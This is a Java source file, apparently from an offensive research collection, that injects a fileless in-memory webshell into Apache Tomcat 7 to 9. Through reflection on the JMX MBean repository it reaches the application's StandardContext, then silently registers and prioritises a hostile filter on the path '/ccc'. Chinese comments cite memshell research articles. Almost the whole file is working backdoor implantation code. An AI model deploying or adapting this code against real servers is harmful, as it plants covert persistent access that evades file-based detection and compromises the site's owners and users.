package com.memshell.tomcat;

import com.memshell.generic.Util;
import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.modeler.Registry;
import javax.management.DynamicMBean;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Set;

public class FilterBasedWithoutRequestVariant extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
//        参考：
//        《Tomcat源代码调试：看不见的Shell第一式》    https://www.freebuf.com/articles/web/151431.html
//        《基于tomcat的内存 Webshell 无文件攻击技术》    https://xz.aliyun.com/t/7388
//        《动态注册之Servlet+Filter+Listener》    https://www.jianshu.com/p/cbe1c3174d41
//        《基于Tomcat无文件Webshell研究》   https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA
//        《tomcat不出网回显连续剧第六集》   https://xz.aliyun.com/t/7535
//        《tomcat结合shiro无文件webshell的技术研究以及检测方法》     https://mp.weixin.qq.com/s/fFYTRrSMjHnPBPIaVn9qMg
//
//        适用范围: Tomcat 7 ~ 9

        try{
            String filterName = "dynamic3";
            String urlPattern = "/ccc";

            MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);

            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository  = (Repository) field.get(obj);

            Set<NamedObject> objectSet =  repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            for(NamedObject namedObject : objectSet){
                try{
                    DynamicMBean dynamicMBean = namedObject.getObject();
                    field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                    field.setAccessible(true);
                    obj = field.get(dynamicMBean);

                    field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
                    field.setAccessible(true);
                    StandardContext standardContext = (StandardContext)field.get(obj);

                    field = standardContext.getClass().getDeclaredField("filterConfigs");
                    field.setAccessible(true);
                    HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);

                    if(map.get(filterName) == null) {
                        System.out.println("[+] Add Dynamic Filter");

                        //生成 FilterDef
                        //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                        Class filterDefClass = null;
                        try {
                            filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
                        } catch (ClassNotFoundException e) {
                            filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                        }

                        Object filterDef = filterDefClass.newInstance();
                        filterDef.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterDef, filterName);

                        Class clazz = Util.getDynamicFilterTemplateClass();
                        filterDef.getClass().getDeclaredMethod("setFilterClass", String.class).invoke(filterDef, clazz.getName());
                        filterDef.getClass().getDeclaredMethod("setFilter", Filter.class).invoke(filterDef, clazz.newInstance());
                        standardContext.getClass().getDeclaredMethod("addFilterDef", filterDefClass).invoke(standardContext, filterDef);

                        //设置 FilterMap
                        //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                        Class filterMapClass = null;
                        try {
                            filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                        } catch (ClassNotFoundException e) {
                            filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                        }

                        //使用 addFilterMapBefore 会自动把我们创建的 filterMap 丢到第一位去，无需在手动排序了
                        //其他中间件应该也是类似的
                        Object filterMap = filterMapClass.newInstance();
                        filterMap.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterMap, filterName);
                        filterMap.getClass().getDeclaredMethod("setDispatcher", String.class).invoke(filterMap, DispatcherType.REQUEST.name());
                        filterMap.getClass().getDeclaredMethod("addURLPattern", String.class).invoke(filterMap, urlPattern);
                        standardContext.getClass().getDeclaredMethod("addFilterMapBefore", filterMapClass).invoke(standardContext, filterMap);

                        //设置 FilterConfig
                        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDefClass);
                        constructor.setAccessible(true);
                        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
                        map.put(filterName, filterConfig);
                    }
                }catch(Exception e){
                    //pass
                }
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}